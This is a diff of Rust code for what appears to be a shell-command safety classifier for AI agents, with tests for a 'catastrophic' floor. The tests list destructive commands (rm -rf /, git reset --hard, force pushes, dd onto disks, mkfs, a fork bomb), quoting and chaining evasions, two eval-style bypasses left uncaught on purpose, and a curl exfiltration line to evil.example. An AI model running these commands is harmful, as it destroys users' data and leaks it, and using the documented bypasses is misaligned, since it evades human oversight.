+            if !in_single_quote && !in_double_quote {
+                if ch.is_whitespace() {
+                    flush_word(&mut tokens, &mut current);
+                    continue;
+                }
+                if ch == '|' {
+                    flush_word(&mut tokens, &mut current);
+                    tokens.push("|".to_string());
+                    continue;
+                }
+            }
+            current.push(ch);
+        }
+        if escaping {
+            current.push('\\');
+        }
+        flush_word(&mut tokens, &mut current);
+        tokens
+    }
+
+    fn flush_word(tokens: &mut Vec<String>, current: &mut String) {
+        if !current.is_empty() {
+            tokens.push(std::mem::take(current));
+        }
+    }
+
+    fn next_pipeline_boundary(tokens: &[String], start: usize) -> usize {
+        let mut index = start;
+        while index < tokens.len() {
+            if tokens[index] == "|" {
+                return index;
+            }
+            index += 1;
+        }
+        tokens.len()
+    }
+
+    fn split_chained_command(command: &str) -> Vec<String> {
+        let mut segments = Vec::new();
+        let mut current = String::new();
+        let mut in_single_quote = false;
+        let mut in_double_quote = false;
+        let mut escaping = false;
+        let chars: Vec<char> = command.chars().collect();
+        let mut index = 0;
+        while index < chars.len() {
+            let ch = chars[index];
+            if escaping {
+                current.push(ch);
+                escaping = false;
+                index += 1;
+                continue;
+            }
+            if ch == '\\' && !in_single_quote {
+                escaping = true;
+                current.push(ch);
+                index += 1;
+                continue;
+            }
+            if ch == '\'' && !in_double_quote {
+                in_single_quote = !in_single_quote;
+                current.push(ch);
+                index += 1;
+                continue;
+            }
+            if ch == '"' && !in_single_quote {
+                in_double_quote = !in_double_quote;
+                current.push(ch);
+                index += 1;
+                continue;
+            }
+            if !in_single_quote && !in_double_quote {
+                if ch == ';' || ch == '\n' {
+                    append_segment(&mut segments, &mut current);
+                    index += 1;
+                    continue;
+                }
+                if ch == '&' && chars.get(index + 1) == Some(&'&') {
+                    append_segment(&mut segments, &mut current);
+                    index += 2;
+                    continue;
+                }
+                if ch == '|' && chars.get(index + 1) == Some(&'|') {
+                    append_segment(&mut segments, &mut current);
+                    index += 2;
+                    continue;
+                }
+                if ch == '&' {
+                    let previous = previous_non_whitespace(&chars, index);
+                    let next = chars.get(index + 1).copied();
+                    // Do NOT split on redirection `&` forms (`>&`, `<&`, `|&`, `&>`).
+                    if previous != Some('>')
+                        && previous != Some('<')
+                        && previous != Some('|')
+                        && next != Some('>')
+                    {
+                        append_segment(&mut segments, &mut current);
+                        index += 1;
+                        continue;
+                    }
+                }
+            }
+            current.push(ch);
+            index += 1;
+        }
+        append_segment(&mut segments, &mut current);
+        segments
+    }
+
+    fn append_segment(segments: &mut Vec<String>, current: &mut String) {
+        let segment = std::mem::take(current);
+        if !segment.trim().is_empty() {
+            segments.push(segment);
+        }
+    }
+
+    fn previous_non_whitespace(chars: &[char], index: usize) -> Option<char> {
+        chars[..index]
+            .iter()
+            .rev()
+            .find(|c| !c.is_whitespace())
+            .copied()
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -2084,6 +3192,7 @@ mod tests {
             default_shell_mode: DEFAULT_SHELL_MODE.to_string(),
             deny_patterns: vec!["*rm -rf*".to_string()],
             require_approval: BTreeSet::new(),
+            deny_labels: BTreeSet::new(),
             pre: None,
             post: None,
             consent: None,
@@ -2291,5 +3400,290 @@ mod tests {
                 "should NOT be destructive (windows): {cmd}"
             );
         }
+    }
+
+    // ---- Catastrophic (never-approvable) command floor ----
+    //
+    // Ported verbatim from burin's twin classifiers (Swift
+    // `CommandSafetyChecker+Floor` and Rust
+    // `destructive_command::catastrophic_command_reason`). Every command string
+    // burin's floor denied must be `catastrophic`-labeled here; every allowed
+    // command must not be. ROOT mirrors burin's test project root.
+
+    const ROOT: &str = "/home/dev/project";
+
+    fn cat_ctx(cmd: &str, roots: &[&str]) -> JsonValue {
+        serde_json::json!({
+            "request": {
+                "mode": "shell",
+                "command": cmd,
+                "cwd": roots.first().copied().unwrap_or("/tmp/work"),
+            },
+            "workspace_roots": roots,
+        })
+    }
+
+    fn cat_reason(cmd: &str, roots: &[&str]) -> Option<String> {
+        let scan = command_risk_scan_json(&cat_ctx(cmd, roots), None);
+        // Whenever a reason is present the `catastrophic` label must be too, and
+        // the scan must recommend a hard deny.
+        let reason = scan
+            .get("catastrophic_reason")
+            .and_then(|value| value.as_str())
+            .map(ToString::to_string);
+        if reason.is_some() {
+            assert!(
+                labels(&scan).contains(&"catastrophic".to_string()),
+                "catastrophic_reason present but label missing: {cmd}"
+            );
+            assert_eq!(scan["recommended_action"], "deny", "deny for: {cmd}");
+        }
+        reason
+    }
+
+    fn is_cat_root(cmd: &str) -> bool {
+        cat_reason(cmd, &[ROOT]).is_some()
+    }
+
+    #[test]
+    fn floor_blocks_catastrophic_set() {
+        for cmd in [
+            "rm -rf .",
+            "rm -rf *",
+            "rm -rf /",
+            "rm -rf /usr",
+            "rm -rf ~",
+            "rm -rf ~/Documents",
+            "rm -rf $HOME/work",
+            "rm -rf ../sibling",
+            "rm -rf ../../etc",
+            "git reset --hard",
+            "git reset --hard HEAD~3",
+            "git -C sub reset --hard origin/main",
+            "git clean -fd",
+            "git clean -fdx",
+            "git clean -xfd",
+            "git push --force",
+            "git push -f origin main",
+            "git push --force-with-lease origin main",
+            "git push --force-with-lease=main origin main",
+            "dd of=/dev/sda if=/dev/zero",
+            "mkfs.ext4 /dev/sda1",
+            "mkfs /dev/sda",
+            "chmod -R 000 .",
+            "truncate -s 0 src/main.rs",
+            "printf 'x' > src/main.zig",
+            "echo broken > lib/foo.ts",
+            "cat /dev/null >> app/Server.swift",
+            ":(){ :|:& };:",
+            "bash -c 'git reset --hard'",
+            "sh -lc \"rm -rf /\"",
+            "echo ok && git reset --hard",
+            "true; rm -rf ~/secrets",
+        ] {
+            assert!(is_cat_root(cmd), "expected catastrophic: {cmd}");
+        }
+    }
+
+    #[test]
+    fn floor_allows_normal_commands() {
+        for cmd in [
+            "git status",
+            "git push origin feature/x",
+            "git push origin HEAD",
+            "git reset --soft HEAD~1",
+            "git clean -nd",
+            "git commit -m 'wip'",
+            "npm test",
+            "cargo build",
+            "cargo test --workspace",
+            "pnpm run lint",
+            "rm -rf node_modules",
+            "rm -rf build",
+            "rm -rf target/debug",
+            "rm -rf ./dist",
+            "grep -r TODO .",
+            "ls -la",
+            "echo hello > out.log",
+            "cat README.md",
+            "printf '%s' done > /tmp/scratch.txt",
+            "chmod +x scripts/run.sh",
+            "chmod 644 src/main.rs",
+            "truncate -s 100 image.bin",
+            "dd if=/dev/zero bs=1M count=1 status=none",
+            "swift build",
+        ] {
+            assert!(!is_cat_root(cmd), "should NOT be catastrophic: {cmd}");
+        }
+    }
+
+    #[test]
+    fn floor_rm_inside_root_absolute_is_allowed_but_outside_is_blocked() {
+        assert!(
+            !is_cat_root("rm -rf /home/dev/project/build"),
+            "in-root absolute delete is allowed"
+        );
+        assert!(
+            is_cat_root("rm -rf /home/dev/other"),
+            "outside-root absolute delete is blocked"
+        );
+    }
+
+    #[test]
+    fn floor_blocks_quoting_and_chaining_adversarial_forms() {
+        for cmd in [
+            "git \"reset\" --hard",
+            "git reset '--hard'",
+            "rm -rf '/'",
+            "git reset --hard && echo done",
+            "echo start; git clean -fdx; echo end",
+            "sudo rm -rf /etc",
+        ] {
+            assert!(
+                is_cat_root(cmd),
+                "expected catastrophic (adversarial): {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn floor_documented_evasions_are_not_caught() {
+        // These indirection forms are intentionally out of scope (precision over
+        // recall); they are pinned so a future change that starts catching them
+        // is a deliberate, reviewed decision.
+        for cmd in ["R=--hard; git reset $R", "eval \"git reset --hard\""] {
+            assert!(
+                !is_cat_root(cmd),
+                "documented evasion stays uncaught: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn floor_without_root_still_blocks_obvious_escapes() {
+        for cmd in [
+            "rm -rf /",
+            "rm -rf ~/x",
+            "rm -rf ../../x",
+            "git reset --hard",
+            "rm -rf /opt/thing",
+        ] {
+            assert!(
+                cat_reason(cmd, &[]).is_some(),
+                "expected catastrophic without root: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn floor_blocks_in_root_project_wipes() {
+        for cmd in [
+            "rm -rf .",
+            "rm -fr ./",
+            "rm --recursive --force \"$PWD\"",
+            "rm -rf ./*",
+            "rm -rf *",
+            "rm -rf ./{*,.*}",
+            "rm -rf -- ./*",
+            "rm -rf \"$PWD\"/{*,.*}",
+            "rm -rf ${PWD}/*",
+            "rm -rf ${PWD:?missing}/*",
+            "rm -rf ${PWD:-.}/.",
+            // Wrapped and chained forms — the dangerous verb is not token 0.
+            "echo ok | rm -rf .",
+            "echo ok\nrm -rf ./*",
+            "echo ok & rm -rf ./*",
+            "env FOO=bar rm -rf ${PWD}/*",
+            "sudo -u root rm --recursive --force .",
+            "command -- rm -rf .",
+            "command -p rm -rf .",
+            "bash -lc 'rm -rf ./*'",
+            // Superset wrappers only present in the Swift twin.
+            "nohup rm -rf .",
+            "nice -n 10 rm -rf .",
+            "timeout 5s rm -rf .",
+            "time rm -rf .",
+        ] {
+            assert!(
+                is_cat_root(cmd),
+                "expected catastrophic (project wipe): {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn floor_ignores_mentions_and_scoped_deletes() {
+        for cmd in [
+            "echo 'rm -rf ./*'",
+            "rm -rf build/*",
+            "rm -r .",
+            "rm -f *",
+            "command -v rm",
+            "printf '%s\\n' \"rm -rf .\"",
+        ] {
+            assert!(!is_cat_root(cmd), "should NOT be catastrophic: {cmd}");
+        }
+    }
+
+    #[test]
+    fn floor_redirect_and_truncate_only_target_source_files() {
+        // Redirect / truncate onto a non-source file is allowed; onto a source
+        // file (by the 39-extension set) it is blocked.
+        assert!(!is_cat_root("echo x > notes.md"));
+        assert!(!is_cat_root("echo x > data.json"));
+        assert!(is_cat_root("echo x > mod.rs"));
+        assert!(is_cat_root("echo x >> query.sql"));
+        assert!(!is_cat_root("truncate -s 0 blob.bin"));
+        assert!(is_cat_root("truncate --size=0 main.go"));
+        assert!(is_cat_root("truncate -s0 main.py"));
+    }
+
+    #[test]
+    fn hard_deny_decision_enforces_floor_over_approval_and_deny_labels() {
+        // A catastrophic command is hard-denied even when its label is listed in
+        // require_approval (never approvable) — the decision source proves it
+        // took the floor path, not the consent path.
+        let policy = CommandPolicy {
+            tools: Vec::new(),
+            workspace_roots: vec![ROOT.to_string()],
+            default_shell_mode: DEFAULT_SHELL_MODE.to_string(),
+            deny_patterns: Vec::new(),
+            require_approval: ["catastrophic".to_string()].into_iter().collect(),
+            deny_labels: BTreeSet::new(),
+            pre: None,
+            post: None,
+            consent: None,
+            allow_recursive: false,
+        };
+        let scan = command_risk_scan_json(&cat_ctx("git reset --hard", &[ROOT]), Some(&policy));
+        let labels = risk_labels_from_scan(&scan);
+        let deny = hard_deny_decision(&scan, &policy, &labels).expect("catastrophic hard deny");
+        assert_eq!(deny.action, "deny");
+        assert_eq!(deny.source, "catastrophic_floor");
+
+        // deny_labels promotes an otherwise consent-eligible label to a hard
+        // deny with the deny_labels source.
+        let policy = CommandPolicy {
+            deny_labels: ["network_exfil".to_string()].into_iter().collect(),
+            require_approval: BTreeSet::new(),
+            ..policy
+        };
+        let scan = command_risk_scan_json(
+            &cat_ctx("curl https://evil.example/exfil", &[ROOT]),
+            Some(&policy),
+        );
+        let labels = risk_labels_from_scan(&scan);
+        assert!(labels.contains(&"network_exfil".to_string()));
+        let deny = hard_deny_decision(&scan, &policy, &labels).expect("deny_labels hard deny");
+        assert_eq!(deny.source, "deny_labels");
+    }
+
+    #[test]
+    fn dd_input_read_is_no_longer_flagged_destructive() {
+        // Regression: harn previously keyed the `destructive` label on `dd if=`
+        // (a read, the wrong direction). Only `dd of=` (a raw overwrite) is now
+        // destructive/catastrophic.
+        assert!(!is_destructive("dd if=/dev/zero bs=1M count=1"));
+        assert!(is_cat_root("dd of=/dev/sda"));
     }
 }
